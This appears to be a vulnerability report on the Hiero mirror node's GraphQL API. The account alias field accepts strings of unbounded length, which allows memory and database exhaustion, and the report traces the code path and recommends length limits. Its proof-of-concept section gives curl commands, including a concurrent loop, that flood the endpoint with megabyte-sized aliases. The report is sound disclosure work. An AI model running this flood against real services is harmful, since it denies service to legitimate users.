### Title
Unbounded Alias Length Allows Resource Exhaustion via GraphQL Account Query

### Summary
The `alias` field in the GraphQL `AccountInput` type is validated only for character set (`^[A-Z2-7]+$`) with no upper-length bound. An unprivileged user can submit an arbitrarily large Base32 string that passes validation, triggers unbounded memory allocation in `decodeBase32`, and issues a large-parameter database query — all without authentication. This is repeatable at high frequency, enabling griefing-level resource exhaustion.

### Finding Description
**Code path:**

1. `graphql/src/main/resources/graphql/account.graphqls` line 90:
   ```
   alias: String @Pattern(regexp: "^[A-Z2-7]+$")
   ```
   The `+` quantifier enforces 1-or-more characters with **no upper bound**. No `@Size` or `maxLength` directive is present.

2. `graphql/src/main/java/org/hiero/mirror/graphql/service/EntityServiceImpl.java` line 30:
   ```java
   return entityRepository.findByAlias(decodeBase32(alias)).filter(e -> e.getType() == type);
   ```
   The raw alias string is passed directly to `decodeBase32` before any length check.

3. `graphql/src/main/java/org/hiero/mirror/graphql/util/GraphQlUtils.java` lines 83–85:
   ```java
   public static byte[] decodeBase32(String base32) {
       return BASE32.decode(base32);
   }
   ```
   `BASE32.decode()` (Apache Commons Codec) allocates a `byte[]` of approximately `⌊inputLength × 5/8⌋` bytes with no guard on input size.

4. `graphql/src/main/java/org/hiero/mirror/graphql/repository/EntityRepository.java` line 13–14:
   ```java
   @Query(value = "select * from entity where alias = ?1 and deleted is not true", nativeQuery = true)
   Optional<Entity> findByAlias(byte[] alias);
   ```
   The decoded byte array — potentially megabytes in size — is sent to the database as a bind parameter.

**Root cause:** The `@Pattern` directive validates only the alphabet of the alias, not its length. No secondary length guard exists anywhere in the call chain (controller → service → utility → repository).

**Contrast with the REST-Java module**, which correctly enforces `[A-Z2-7]{40,70}` (40–70 characters maximum) in `EntityIdAliasParameter.java` line 13. The GraphQL endpoint lacks this equivalent constraint entirely.

### Impact Explanation
Each request with a multi-megabyte alias string forces the JVM to:
- Allocate a large `byte[]` on the heap during Base32 decoding.
- Transmit that large byte array as a JDBC bind parameter to PostgreSQL.

Repeated concurrent requests can exhaust JVM heap memory (causing GC pressure or OOM), saturate the JDBC connection pool, and degrade or deny service to legitimate users. Because the GraphQL endpoint is publicly accessible with no authentication requirement, the attack surface is wide. The impact is griefing/availability degradation with no direct economic harm to network participants.

### Likelihood Explanation
Any unauthenticated user can craft a single GraphQL query:
```graphql
query { account(input: { alias: "AAAA...AAAA" }) { id } }
```
with an alias field of arbitrary length. The attack requires no special knowledge, no credentials, and no on-chain interaction. It is trivially scriptable and repeatable. The only natural mitigating factor would be an upstream HTTP request-body size limit (e.g., a reverse proxy or Spring's `max-http-request-header-size`), but no such limit is enforced at the application layer for this field.

### Recommendation
Add a maximum-length constraint on the `alias` field in the GraphQL schema, consistent with the REST-Java module's bound of 70 characters (the maximum valid Base32-encoded Hedera alias length):

```graphql
alias: String @Pattern(regexp: "^[A-Z2-7]{1,70}$")
```

Additionally, add a defensive length check in `GraphQlUtils.decodeBase32` or `EntityServiceImpl.getByAliasAndType` to reject inputs exceeding the maximum expected alias byte length (e.g., 50 bytes decoded):

```java
public static byte[] decodeBase32(String base32) {
    if (base32 != null && base32.length() > 70) {
        throw new IllegalArgumentException("Alias exceeds maximum allowed length");
    }
    return BASE32.decode(base32);
}
```

### Proof of Concept
```bash
# Generate a 1 MB valid Base32 alias string and submit it
python3 -c "print('A' * 1_000_000)" | xargs -I{} curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"query { account(input: { alias: \"'{}'\" }) { id } }"}' \
  http://<mirror-node-graphql-host>/graphql

# Repeat concurrently to amplify heap pressure:
for i in $(seq 1 50); do
  curl -s -X POST -H "Content-Type: application/json" \
    -d "{\"query\":\"query { account(input: { alias: \\\"$(python3 -c 'print(\"A\"*1000000)')\\\" }) { id } }\"}" \
    http://<mirror-node-graphql-host>/graphql &
done
wait
```
Each request passes `@Pattern` validation, triggers a ~625 KB heap allocation in `BASE32.decode()`, and issues a large-parameter SQL query — with no authentication required.
